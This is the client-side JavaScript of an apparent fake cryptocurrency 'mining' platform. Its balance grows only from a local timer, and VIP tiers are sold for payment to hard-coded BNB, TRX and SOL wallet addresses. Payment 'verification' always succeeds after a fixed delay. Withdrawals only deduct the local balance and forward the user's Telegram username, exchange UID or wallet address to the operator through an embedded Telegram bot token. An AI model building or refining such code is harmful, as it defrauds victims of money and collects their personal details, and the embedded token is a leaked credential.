// === COMPLETE JAVASCRIPT CODE ===

// DOM Elements
const navItems = document.querySelectorAll('.nav-item');
const startMiningBtn = document.getElementById('startMiningBtn');
const vipMiningBtns = document.querySelectorAll('.vip-mining-btn');
const buyVipBtns = document.querySelectorAll('.buy-vip');
const paymentModal = document.getElementById('paymentModal');
const closePaymentBtn = document.getElementById('closePaymentBtn');
const chainOptions = document.querySelectorAll('.chain-option');
const copyAddressBtn = document.getElementById('copyAddressBtn');
const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
const withdrawSubmitBtns = document.querySelectorAll('.withdraw-submit');
const redeemCodeBtn = document.getElementById('redeemCodeBtn');
const submitVerificationBtn = document.getElementById('submitVerificationBtn');
const withdrawalTabs = document.querySelectorAll('.withdrawal-tab');
const fileUploadArea = document.getElementById('fileUploadArea');
const screenshotUpload = document.getElementById('screenshotUpload');

// Mining Elements
const miningCircle = document.querySelector('.mining-circle');
const miningCore = document.querySelector('.mining-core');
const miningParticles = document.querySelectorAll('.mining-particle');
const miningStatusText = document.getElementById('miningStatus');
const miningSpeedText = document.getElementById('miningSpeed');

// User data
let userData = {
    balance: 0.00,
    todayEarnings: 0.00,
    totalEarned: 0.00,
    userStatus: 'free',
    dailyEarning: 0.10,
    lastClaim: null,
    vipExpiry: null,
    userId: 'USR738225',
    userName: 'User738225',
    miningActive: false,
    miningStartTime: null,
    totalMiningTime: 0,
    totalMined: 0.0000,
    currentSpeed: 0.5,
    withdrawalHistory: []
};

// VIP Codes (10 codes for VIP 2 - 60 USDT value)
const vipCodes = [
    { code: 'VIP60A7B9C1', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60D2E3F4', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60G5H6I7', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60J8K9L0', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60M1N2O3', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60P4Q5R6', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60S7T8U9', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60V0W1X2', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60Y3Z4A5', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60B6C7D8', used: false, value: 60, type: 'vip2' }
];

// Wallet addresses
const walletAddresses = {
    bnb: '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    trx: 'TSKPhwUavSrKXXcbWG2TdPzYiBtoTNXP6i',
    sol: 'HvHR4LeKdCH5Z2UDKVSDuju8c4ukPAa1CzchHseZ2LKu'
};

// Telegram API
const telegramBotToken = '7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI';
const telegramChatId = '7417215529';

// Mining intervals
let miningInterval;
let statsInterval;

// Initialize the app
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Initializing BNB Mining Platform...');
    loadUserData();
    updateUI();
    setupTabNavigation();
    setupWithdrawalTabs();
    loadRedeemCodes();
    setupFileUpload();
    setupEventListeners();
    startStatsTimer();
    
    console.log('✅ Platform initialized successfully');
    console.log('🎁 Available VIP Codes:', vipCodes.filter(vc => !vc.used).map(vc => vc.code));
});

// Setup all event listeners
function setupEventListeners() {
    console.log('🔧 Setting up event listeners...');
    
    // Mining buttons
    if (startMiningBtn) {
        startMiningBtn.addEventListener('click', handleMiningToggle);
    }
    
    if (vipMiningBtns.length > 0) {
        vipMiningBtns.forEach(btn => {
            btn.addEventListener('click', handleVipMining);
        });
    }
    
    // VIP purchase buttons
    if (buyVipBtns.length > 0) {
        buyVipBtns.forEach(btn => {
            btn.addEventListener('click', handleVipPurchase);
        });
    }
    
    // Payment modal
    if (closePaymentBtn) {
        closePaymentBtn.addEventListener('click', closePaymentModal);
    }
    
    // Chain options
    if (chainOptions.length > 0) {
        chainOptions.forEach(option => {
            option.addEventListener('click', handleChainSelection);
        });
    }
    
    // Copy address
    if (copyAddressBtn) {
        copyAddressBtn.addEventListener('click', handleCopyAddress);
    }
    
    // Confirm payment
    if (confirmPaymentBtn) {
        confirmPaymentBtn.addEventListener('click', handleConfirmPayment);
    }
    
    // Withdrawal buttons
    if (withdrawSubmitBtns.length > 0) {
        withdrawSubmitBtns.forEach(btn => {
            btn.addEventListener('click', handleWithdrawal);
        });
    }
    
    // Redeem code
    if (redeemCodeBtn) {
        redeemCodeBtn.addEventListener('click', handleRedeemCode);
    }
    
    // Verification submission
    if (submitVerificationBtn) {
        submitVerificationBtn.addEventListener('click', handleVerificationSubmission);
    }
    
    console.log('✅ All event listeners setup complete');
}

// Load user data from localStorage
function loadUserData() {
    const savedData = localStorage.getItem('bnbMiningUserData');
    if (savedData) {
        try {
            userData = JSON.parse(savedData);
            console.log('📁 User data loaded from storage');
            
            // Restore mining state if it was active
            if (userData.miningActive) {
                startMiningVisuals();
            }
        } catch (e) {
            console.error('❌ Error loading user data:', e);
            resetUserData();
        }
    } else {
        resetUserData();
    }
}

// Reset user data to defaults
function resetUserData() {
    userData = {
        balance: 0.00,
        todayEarnings: 0.00,
        totalEarned: 0.00,
        userStatus: 'free',
        dailyEarning: 0.10,
        lastClaim: null,
        vipExpiry: null,
        userId: 'USR' + Math.floor(100000 + Math.random() * 900000),
        userName: 'User' + Math.floor(100000 + Math.random() * 900000),
        miningActive: false,
        miningStartTime: null,
        totalMiningTime: 0,
        totalMined: 0.0000,
        currentSpeed: 0.5,
        withdrawalHistory: []
    };
    saveUserData();
    console.log('🔄 User data reset to defaults');
}

// Save user data to localStorage
function saveUserData() {
    try {
        localStorage.setItem('bnbMiningUserData', JSON.stringify(userData));
        console.log('💾 User data saved');
    } catch (e) {
        console.error('❌ Error saving user data:', e);
    }
}

// Update UI with user data
function updateUI() {
    console.log('🎨 Updating UI...');
    
    // Update balance displays
    document.getElementById('userBalance').textContent = userData.balance.toFixed(2) + ' USDT';
    document.getElementById('todayEarnings').textContent = userData.todayEarnings.toFixed(2) + ' USDT';
    document.getElementById('totalEarned').textContent = userData.totalEarned.toFixed(2) + ' USDT';
    document.getElementById('userId').textContent = userData.userId;
    
    // Update user status
    const statusElement = document.getElementById('userStatus');
    if (userData.userStatus === 'vip') {
        statusElement.textContent = 'VIP User';
        statusElement.className = 'status-vip';
    } else {
        statusElement.textContent = 'Free User';
        statusElement.className = 'status-free';
    }
    
    // Update mining speed
    updateMiningSpeed();
    updateWithdrawalLimits();
    updateStatsDisplay();
    
    console.log('✅ UI updated successfully');
}

// Update mining speed based on user status
function updateMiningSpeed() {
    let speed = 0.5; // Free user default
    
    if (userData.userStatus === 'vip') {
        if (userData.dailyEarning === 1.00) {
            speed = 2.5; // VIP 1
        } else if (userData.dailyEarning === 7.00) {
            speed = 15.0; // VIP 2
        }
    }
    
    userData.currentSpeed = speed;
    miningSpeedText.textContent = `Speed: ${speed} BNB/H`;
    
    // Update stats display
    document.getElementById('currentSpeed').textContent = speed + ' BNB/H';
}

// Update withdrawal limits
function updateWithdrawalLimits() {
    const limits = document.querySelectorAll('.form-hint');
    const limitText = userData.userStatus === 'free' ? 'Free User Limit: 0.02 USDT' : 'VIP User: No Limit';
    
    limits.forEach(limit => {
        limit.textContent = limitText;
    });
    
    // Update input max values
    const amountInputs = document.querySelectorAll('input[type="number"]');
    amountInputs.forEach(input => {
        if (userData.userStatus === 'free') {
            input.max = 0.02;
        } else {
            input.removeAttribute('max');
        }
    });
}

// Update stats display
function updateStatsDisplay() {
    document.getElementById('totalMiningTime').textContent = formatTime(userData.totalMiningTime);
    document.getElementById('totalMined').textContent = userData.totalMined.toFixed(4) + ' BNB';
    document.getElementById('currentSpeed').textContent = userData.currentSpeed + ' BNB/H';
}

// Format time (seconds to HH:MM:SS)
function formatTime(seconds) {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = Math.floor(seconds % 60);
    
    return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

// Setup tab navigation
function setupTabNavigation() {
    navItems.forEach(item => {
        item.addEventListener('click', function() {
            // Remove active class from all items
            navItems.forEach(nav => nav.classList.remove('active'));
            
            // Add active class to clicked item
            this.classList.add('active');
            
            // Get the tab name
            const tabName = this.getAttribute('data-tab');
            
            // Show/hide sections based on tab
            document.querySelectorAll('.container > div').forEach(section => {
                if (section.classList.contains('header') || section.classList.contains('balance-card')) {
                    // Always show header and balance
                    return;
                }
                
                if (section.classList.contains(tabName + '-card') || 
                    (tabName === 'home' && (section.classList.contains('mining-section') || section.classList.contains('redeem-card')))) {
                    section.style.display = 'block';
                } else {
                    section.style.display = 'none';
                }
            });
        });
    });
}

// Setup withdrawal tabs
function setupWithdrawalTabs() {
    withdrawalTabs.forEach(tab => {
        tab.addEventListener('click', function() {
            // Remove active class from all tabs
            withdrawalTabs.forEach(t => t.classList.remove('active'));
            
            // Add active class to clicked tab
            this.classList.add('active');
            
            // Get tab type
            const tabType = this.getAttribute('data-tab');
            
            // Show corresponding content
            document.querySelectorAll('.withdrawal-content').forEach(content => {
                content.classList.remove('active');
            });
            
            document.getElementById(tabType + 'Withdrawal').classList.add('active');
        });
    });
}

// Load redeem codes
function loadRedeemCodes() {
    const codesList = document.getElementById('redeemCodesList');
    if (!codesList) return;
    
    codesList.innerHTML = '';
    
    vipCodes.forEach(vipCode => {
        const codeElement = document.createElement('div');
        codeElement.className = `vip-code-item ${vipCode.used ? 'used' : 'available'}`;
        codeElement.textContent = vipCode.code;
        codeElement.title = vipCode.used ? 'Already used' : 'Click to copy and auto-fill';
        
        if (!vipCode.used) {
            codeElement.addEventListener('click', function() {
                copyToClipboard(vipCode.code);
                
                // Auto-fill the redeem code input
                const redeemInput = document.getElementById('redeemCodeInput');
                if (redeemInput) {
                    redeemInput.value = vipCode.code;
                }
                
                showNotification(`VIP code ${vipCode.code} copied to clipboard!`, 'success');
            });
        }
        
        codesList.appendChild(codeElement);
    });
}

// Setup file upload
function setupFileUpload() {
    if (!fileUploadArea || !screenshotUpload) return;
    
    fileUploadArea.addEventListener('click', function() {
        screenshotUpload.click();
    });
    
    screenshotUpload.addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (file) {
            // Check file type
            if (!file.type.startsWith('image/')) {
                showNotification('Please upload an image file', 'error');
                return;
            }
            
            // Check file size (max 5MB)
            if (file.size > 5 * 1024 * 1024) {
                showNotification('File size must be less than 5MB', 'error');
                return;
            }
            
            const reader = new FileReader();
            reader.onload = function(e) {
                const filePreview = document.getElementById('filePreview');
                filePreview.innerHTML = `<img src="${e.target.result}" alt="Screenshot Preview">`;
                filePreview.style.display = 'block';
                showNotification('Screenshot uploaded successfully!', 'success');
            };
            reader.readAsDataURL(file);
        }
    });
}

// Start stats timer
function startStatsTimer() {
    statsInterval = setInterval(() => {
        if (userData.miningActive) {
            userData.totalMiningTime++;
            updateStatsDisplay();
        }
    }, 1000);
}

// Handle mining toggle
function handleMiningToggle() {
    if (userData.miningActive) {
        stopMining();
    } else {
        startMining();
    }
}

// Start mining
function startMining() {
    if (userData.miningActive) return;
    
    userData.miningActive = true;
    userData.miningStartTime = Date.now();
    
    // Update UI
    startMiningBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Mining';
    startMiningBtn.classList.add('active');
    startMiningVisuals();
    
    // Start mining process
    miningInterval = setInterval(() => {
        const miningRate = userData.currentSpeed / 3600; // Convert hourly rate to per-second
        const minedAmount = miningRate;
        
        userData.totalMined += minedAmount;
        userData.balance += minedAmount;
        userData.totalEarned += minedAmount;
        
        saveUserData();
        updateUI();
        
        // Occasionally create mining effect
        if (Math.random() > 0.7) {
            createMiningEffect();
        }
        
        // Occasionally create floating coin
        if (Math.random() > 0.9) {
            createFloatingCoin();
        }
    }, 1000);
    
    showNotification('Mining started! Earning BNB...', 'success');
    sendTelegramMessage(`⛏️ User ${userData.userId} started mining | Speed: ${userData.currentSpeed} BNB/H`);
}

// Stop mining
function stopMining() {
    if (!userData.miningActive) return;
    
    userData.miningActive = false;
    
    // Update UI
    startMiningBtn.innerHTML = '<i class="fas fa-play"></i> Start Mining';
    startMiningBtn.classList.remove('active');
    stopMiningVisuals();
    
    // Stop mining interval
    clearInterval(miningInterval);
    
    // Calculate session mining time
    if (userData.miningStartTime) {
        const sessionTime = Math.floor((Date.now() - userData.miningStartTime) / 1000);
        userData.totalMiningTime += sessionTime;
        userData.miningStartTime = null;
    }
    
    saveUserData();
    updateStatsDisplay();
    
    if (userData.totalMined > 0) {
        showNotification(`Mining stopped! Earned ${userData.totalMined.toFixed(6)} BNB this session`, 'success');
    }
    
    sendTelegramMessage(`⛏️ User ${userData.userId} stopped mining | Total mined: ${userData.totalMined.toFixed(4)} BNB`);
}

// Start mining visuals
function startMiningVisuals() {
    miningCircle.classList.add('active');
    miningCore.classList.add('active');
    miningStatusText.textContent = 'Mining Active';
    miningStatusText.classList.add('active');
    
    miningParticles.forEach(particle => {
        particle.style.animationDelay = `${Math.random() * 2}s`;
    });
}

// Stop mining visuals
function stopMiningVisuals() {
    miningCircle.classList.remove('active');
    miningCore.classList.remove('active');
    miningStatusText.textContent = 'Mining Inactive';
    miningStatusText.classList.remove('active');
}

// Handle VIP mining
function handleVipMining(event) {
    const vipType = event.currentTarget.getAttribute('data-vip');
    
    if (userData.userStatus !== 'vip') {
        showNotification('Please purchase VIP membership to use VIP mining', 'error');
        return;
    }
    
    // Adjust mining speed based on VIP type
    if (vipType === 'vip1') {
        userData.currentSpeed = 2.5;
    } else if (vipType === 'vip2') {
        userData.currentSpeed = 15.0;
    }
    
    // Restart mining with new speed
    if (userData.miningActive) {
        stopMining();
        setTimeout(() => {
            startMining();
        }, 100);
    }
    
    showNotification(`VIP ${vipType} mining activated! Speed: ${userData.currentSpeed} BNB/H`, 'success');
}

// Handle VIP purchase
function handleVipPurchase(event) {
    const tier = event.currentTarget.getAttribute('data-tier');
    const price = event.currentTarget.getAttribute('data-price');
    
    document.getElementById('paymentTitle').textContent = `Buy ${tier.toUpperCase()} - ${price} USDT`;
    document.getElementById('paymentModal').setAttribute('data-tier', tier);
    document.getElementById('paymentModal').setAttribute('data-price', price);
    
    // Set memo
    const memo = `${tier}_${userData.userId}`;
    document.getElementById('memoDisplay').textContent = memo;
    
    paymentModal.style.display = 'flex';
    document.body.style.overflow = 'hidden';
}

// Handle chain selection
function handleChainSelection(event) {
    chainOptions.forEach(opt => opt.classList.remove('active'));
    event.currentTarget.classList.add('active');
    
    const chain = event.currentTarget.getAttribute('data-chain');
    const addressDisplay = document.getElementById('addressDisplay');
    const tier = document.getElementById('paymentModal').getAttribute('data-tier');
    const memo = `${tier}_${userData.userId}`;
    
    addressDisplay.innerHTML = `
        <strong>${chain.toUpperCase()} Address:</strong><br>
        <span style="user-select: all; font-family: monospace;">${walletAddresses[chain]}</span>
        <br><br>
        <strong>Memo Required:</strong> <span style="font-family: monospace;">${memo}</span>
    `;
    addressDisplay.style.display = 'block';
    
    copyAddressBtn.disabled = false;
}

// Handle copy address
function handleCopyAddress() {
    const addressDisplay = document.getElementById('addressDisplay');
    const addressText = addressDisplay.textContent;
    
    copyToClipboard(addressText);
    showNotification('Address and memo copied to clipboard!', 'success');
}

// Handle confirm payment
function handleConfirmPayment() {
    const selectedChain = document.querySelector('.chain-option.active');
    if (!selectedChain) {
        showNotification('Please select a payment method', 'error');
        return;
    }
    
    // Show verification section
    document.getElementById('verificationSection').style.display = 'block';
    
    // Close payment modal
    paymentModal.style.display = 'none';
    document.body.style.overflow = 'auto';
    resetPaymentModal();
    
    showNotification('Please submit your payment verification details', 'success');
}

// Close payment modal
function closePaymentModal() {
    paymentModal.style.display = 'none';
    document.body.style.overflow = 'auto';
    resetPaymentModal();
}

// Reset payment modal
function resetPaymentModal() {
    chainOptions.forEach(opt => opt.classList.remove('active'));
    const addressDisplay = document.getElementById('addressDisplay');
    if (addressDisplay) {
        addressDisplay.style.display = 'none';
    }
    copyAddressBtn.disabled = true;
}

// Handle verification submission
function handleVerificationSubmission() {
    const telegramUsername = document.getElementById('telegramUsername');
    const screenshotFile = screenshotUpload.files[0];
    
    if (!telegramUsername || !telegramUsername.value.trim()) {
        showNotification('Please enter your Telegram username', 'error');
        return;
    }
    
    if (!screenshotFile) {
        showNotification('Please upload payment screenshot', 'error');
        return;
    }
    
    const tier = document.getElementById('paymentModal').getAttribute('data-tier');
    const price = document.getElementById('paymentModal').getAttribute('data-price');
    
    // Simulate verification process
    showNotification('Payment verification submitted! Processing...', 'success');
    
    setTimeout(() => {
        // Activate VIP after verification
        activateVIP(tier, price);
        
        // Hide verification section
        document.getElementById('verificationSection').style.display = 'none';
        
        // Clear form
        telegramUsername.value = '';
        const filePreview = document.getElementById('filePreview');
        if (filePreview) {
            filePreview.innerHTML = '';
            filePreview.style.display = 'none';
        }
        screenshotUpload.value = '';
        
        showNotification(`Payment verified! ${tier.toUpperCase()} activated successfully!`, 'success');
        
        // Send Telegram notification with user details
        sendTelegramMessage(`✅ PAYMENT VERIFIED\nUser: ${userData.userId}\nTelegram: ${telegramUsername.value}\nVIP: ${tier.toUpperCase()}\nAmount: ${price} USDT`);
    }, 3000);
}

// Activate VIP
function activateVIP(tier, price) {
    userData.userStatus = 'vip';
    
    if (tier === 'vip1') {
        userData.dailyEarning = 1.00;
        userData.currentSpeed = 2.5;
    } else if (tier === 'vip2') {
        userData.dailyEarning = 7.00;
        userData.currentSpeed = 15.0;
    }
    
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + 30);
    userData.vipExpiry = expiryDate.toISOString();
    
    saveUserData();
    updateUI();
    
    // Update mining speed if active
    if (userData.miningActive) {
        stopMining();
        setTimeout(() => {
            startMining();
        }, 100);
    }
    
    sendTelegramMessage(`🎉 VIP ACTIVATED\nUser: ${userData.userId}\nVIP: ${tier.toUpperCase()}\nDaily: ${userData.dailyEarning} USDT\nSpeed: ${userData.currentSpeed} BNB/H`);
    
    // Add celebration effect
    createCelebrationEffect();
}

// Handle redeem code
function handleRedeemCode() {
    const codeInput = document.getElementById('redeemCodeInput');
    if (!codeInput) return;
    
    const code = codeInput.value.trim().toUpperCase();
    
    if (!code) {
        showNotification('Please enter a VIP code', 'error');
        return;
    }
    
    if (code.length !== 10) {
        showNotification('VIP code must be 10 characters', 'error');
        return;
    }
    
    const vipCode = vipCodes.find(vc => vc.code === code);
    
    if (!vipCode) {
        showNotification('Invalid VIP code', 'error');
        return;
    }
    
    if (vipCode.used) {
        showNotification('This VIP code has already been used', 'error');
        return;
    }
    
    // Activate VIP based on code type
    vipCode.used = true;
    userData.userStatus = 'vip';
    
    if (vipCode.type === 'vip2') {
        userData.dailyEarning = 7.00;
        userData.currentSpeed = 15.0;
    }
    
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + 30);
    userData.vipExpiry = expiryDate.toISOString();
    
    saveUserData();
    updateUI();
    loadRedeemCodes();
    
    // Update mining speed if active
    if (userData.miningActive) {
        stopMining();
        setTimeout(() => {
            startMining();
        }, 100);
    }
    
    showNotification(`VIP activated with code ${code}! Daily earning: ${userData.dailyEarning} USDT`, 'success');
    sendTelegramMessage(`🎁 VIP CODE REDEEMED\nUser: ${userData.userId}\nCode: ${code}\nVIP: ${vipCode.type.toUpperCase()}\nDaily: ${userData.dailyEarning} USDT`);
    
    // Clear input
    codeInput.value = '';
    
    // Add celebration effect
    createCelebrationEffect();
}

// Handle withdrawal
function handleWithdrawal(event) {
    const withdrawalType = event.currentTarget.getAttribute('data-type');
    
    let amount, uid, address, coin;
    
    switch (withdrawalType) {
        case 'bitget':
            amount = parseFloat(document.getElementById('bitgetAmount').value);
            uid = document.getElementById('bitgetUid').value.trim();
            break;
        case 'bybit':
            amount = parseFloat(document.getElementById('bybitAmount').value);
            uid = document.getElementById('bybitUid').value.trim();
            break;
        case 'blockchain':
            amount = parseFloat(document.getElementById('blockchainAmount').value);
            address = document.getElementById('blockchainAddress').value.trim();
            coin = document.getElementById('blockchainCoin').value;
            break;
    }
    
    // Validation
    if (!amount || amount <= 0) {
        showNotification('Please enter a valid amount', 'error');
        return;
    }
    
    if (userData.userStatus === 'free' && amount > 0.02) {
        showNotification('Free users can only withdraw up to 0.02 USDT', 'error');
        return;
    }
    
    if (userData.userStatus === 'free' && amount < 0.01) {
        showNotification('Minimum withdrawal is 0.01 USDT for free users', 'error');
        return;
    }
    
    if (amount > userData.balance) {
        showNotification('Insufficient balance', 'error');
        return;
    }
    
    if ((withdrawalType === 'bitget' || withdrawalType === 'bybit') && !uid) {
        showNotification(`Please enter your ${withdrawalType} UID`, 'error');
        return;
    }
    
    if (withdrawalType === 'blockchain' && !address) {
        showNotification('Please enter withdrawal address', 'error');
        return;
    }
    
    if (withdrawalType === 'blockchain' && !validateAddress(address, coin)) {
        showNotification(`Invalid ${coin.toUpperCase()} address format`, 'error');
        return;
    }
    
    // Process withdrawal
    userData.balance -= amount;
    
    // Add to withdrawal history
    userData.withdrawalHistory.push({
        type: withdrawalType,
        amount: amount,
        coin: coin || 'usdt',
        address: address || uid,
        timestamp: new Date().toISOString(),
        status: 'pending'
    });
    
    saveUserData();
    updateUI();
    
    showNotification(`Withdrawal request submitted for ${amount} USDT. Processing within 24 hours.`, 'success');
    
    // Send Telegram notification
    let telegramMessage = `💸 WITHDRAWAL REQUEST\nUser: ${userData.userId}\nAmount: ${amount} USDT\nType: ${withdrawalType.toUpperCase()}\n`;
    
    if (withdrawalType === 'blockchain') {
        telegramMessage += `Coin: ${coin.toUpperCase()}\nAddress: ${address}`;
    } else {
        telegramMessage += `UID: ${uid}`;
    }
    
    sendTelegramMessage(telegramMessage);
    
    // Clear form
    switch (withdrawalType) {
        case 'bitget':
            document.getElementById('bitgetAmount').value = '';
            document.getElementById('bitgetUid').value = '';
            break;
        case 'bybit':
            document.getElementById('bybitAmount').value = '';
            document.getElementById('bybitUid').value = '';
            break;
        case 'blockchain':
            document.getElementById('blockchainAmount').value = '';
            document.getElementById('blockchainAddress').value = '';
            break;
    }
}

// Validate cryptocurrency address
function validateAddress(address, coin) {
    switch (coin) {
        case 'bnb':
            return address.length === 42 && address.startsWith('0x');
        case 'trx':
            return address.length === 34 && address.startsWith('T');
        case 'sol':
            return address.length === 44;
        case 'usdt':
            // USDT can be on multiple chains
            return (address.length === 42 && address.startsWith('0x')) || 
                   (address.length === 34 && address.startsWith('T')) ||
                   (address.length === 44);
        default:
            return true;
    }
}

// Utility functions
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        console.log('📋 Text copied to clipboard');
    }).catch(err => {
        console.error('❌ Failed to copy text: ', err);
        showNotification('Failed to copy to clipboard', 'error');
    });
}

function showNotification(message, type) {
    // Remove existing notifications
    document.querySelectorAll('.notification').forEach(notif => notif.remove());
    
    const notification = document.createElement('div');
    notification.className = `notification ${type === 'error' ? 'error' : ''}`;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? 'var(--success-color)' : 'var(--danger-color)'};
        color: white;
        padding: 15px 20px;
        border-radius: 10px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        z-index: 3000;
        max-width: 300px;
        animation: slideInRight 0.5s ease;
    `;
    
    notification.innerHTML = `
        <div style="display: flex; align-items: center;">
            <i class="fas fa-${type === 'success' ? 'check' : 'exclamation'}-circle" style="margin-right: 10px;"></i>
            <div>${message}</div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    // Remove notification after 3 seconds
    setTimeout(() => {
        if (notification.parentElement) {
            notification.style.animation = 'slideInRight 0.5s ease reverse';
            setTimeout(() => {
                notification.remove();
            }, 500);
        }
    }, 3000);
}

/**
 * sendTelegramMessage
 * - Attempts to send message directly to Telegram Bot API.
 * - If direct request fails (CORS or network), tries a public CORS proxy fallback.
 * - If both fail, shows an error notification advising to use a server-side proxy.
 */
function sendTelegramMessage(message) {
    // Build payload
    const payload = {
        chat_id: telegramChatId,
        text: message,
        parse_mode: 'HTML'
    };

    // Direct fetch to Telegram API
    const urlDirect = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    return fetch(urlDirect, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(res => {
        if (!res.ok) throw new Error('Telegram API direct request failed');
        return res.json();
    })
    .then(data => {
        if (data && data.ok) {
            console.log('✅ Message sent to Telegram successfully (direct).');
            return true;
        } else {
            throw new Error('Telegram API returned error (direct)');
        }
    })
    .catch(err => {
        console.warn('⚠️ Direct Telegram send failed:', err);

        // Try using a CORS proxy fallback
        // NOTE: Public proxies may be rate-limited or unreliable.
        // If this also fails, the user should host a small serverless function to send messages reliably.
        const proxyPrefix = 'https://corsproxy.io/?';
        const urlProxy = proxyPrefix + encodeURIComponent(urlDirect);

        return fetch(urlProxy, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(res => {
            if (!res.ok) throw new Error('Telegram API proxy request failed');
            return res.json();
        })
        .then(data => {
            if (data && (data.ok || data.result)) {
                console.log('✅ Message sent to Telegram successfully (proxy).');
                return true;
            } else {
                throw new Error('Telegram API returned error (proxy)');
            }
        })
        .catch(err2 => {
            console.error('❌ All attempts to send Telegram message failed:', err2);
            showNotification('Telegram message failed (CORS or network). For 100% reliability, use a server-side proxy (Netlify/Vercel/Cloudflare Worker).', 'error');
            return false;
        });
    });
}

// Visual effects
function createMiningEffect() {
    const effect = document.createElement('div');
    effect.className = 'mining-effect';
    effect.style.cssText = `
        position: absolute;
        width: 20px;
        height: 20px;
        background: var(--mining-active);
        border-radius: 50%;
        pointer-events: none;
        z-index: 100;
        animation: miningEffect 1s ease-out forwards;
    `;
    
    // Random position around mining circle
    const angle = Math.random() * Math.PI * 2;
    const radius = 60 + Math.random() * 30;
    const x = Math.cos(angle) * radius;
    const y = Math.sin(angle) * radius;
    
    effect.style.left = `calc(50% + ${x}px)`;
    effect.style.top = `calc(50% + ${y}px)`;
    
    miningCircle.appendChild(effect);
    
    // Remove effect after animation
    setTimeout(() => {
        if (effect.parentElement) {
            effect.remove();
        }
    }, 1000);
}

function createCelebrationEffect() {
    for (let i = 0; i < 20; i++) {
        setTimeout(() => {
            createFloatingCoin();
        }, i * 50);
    }
}

function createFloatingCoin() {
    const coin = document.createElement('div');
    coin.className = 'floating-coin';
    coin.textContent = '💰';
    coin.style.cssText = `
        position: fixed;
        font-size: 20px;
        opacity: 0;
        animation: floatCoin 2s ease-in forwards;
        left: ${Math.random() * 100}%;
        top: 100%;
        z-index: 1000;
        pointer-events: none;
    `;
    
    document.body.appendChild(coin);
    
    setTimeout(() => {
        coin.remove();
    }, 2000);
}

// Add mining effect animation
const miningEffectStyle = document.createElement('style');
miningEffectStyle.textContent = `
    @keyframes miningEffect {
        0% {
            transform: scale(1);
            opacity: 1;
        }
        100% {
            transform: scale(0);
            opacity: 0;
        }
    }
`;
document.head.appendChild(miningEffectStyle);

// Export functions for debugging
window.debugUserData = () => userData;
window.debugVIPCodes = () => vipCodes;
window.resetApp = () => {
    localStorage.removeItem('bnbMiningUserData');
    location.reload();
};

console.log('🎮 Debug commands available:');
console.log('   - debugUserData(): Check current user data');
console.log('   - debugVIPCodes(): Check VIP codes status');
console.log('   - resetApp(): Reset application data');
